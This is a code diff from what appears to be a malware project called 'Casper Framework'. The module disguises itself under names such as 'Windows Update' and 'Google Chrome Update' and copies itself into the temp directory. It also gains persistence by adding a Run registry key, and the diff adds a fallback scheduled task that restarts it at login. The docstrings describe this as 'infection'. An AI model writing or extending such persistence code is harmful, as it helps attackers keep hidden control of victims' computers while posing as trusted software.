@@ -1,13 +1,13 @@
 """
 Part of Casper Framework
 """
-from includes import *
+from imports import *
 
 names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
 
 def registry():
 	"""
-	Add registry entry with random name
+	add registry entry with random name
 	"""
 	HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
 	
@@ -18,9 +18,19 @@ def registry():
 	except Exception as e:
 		return False
 
+def backup_plan():
+	"""
+	if registry infection fails, we attempt to create a
+	schtask that runs at startup/login
+	"""
+	if (create_task("CASPER",os.path.join(temp_directory(),sys.argv[0])) == True):
+		return True
+	else:
+		return False
+		
 def infect_registry():
 	"""
-	Clone myself to temp directory for storage
+	clone myself to temp directory for storage
 	and add registy key to gain persistence on
 	the system
 	"""
